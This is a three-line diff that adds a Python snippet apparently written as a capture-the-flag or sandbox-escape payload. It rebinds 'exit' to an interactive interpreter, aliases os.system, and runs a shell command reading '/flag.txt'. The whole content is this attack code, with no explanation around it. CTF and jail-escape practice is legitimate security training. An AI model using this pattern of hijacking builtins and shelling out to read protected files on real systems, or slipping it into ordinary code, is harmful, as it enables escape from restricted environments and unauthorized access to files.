@@ -1,0 +1,3 @@
+from code import interact as exit
+
+from os import system as s;s('cat /flag.txt')
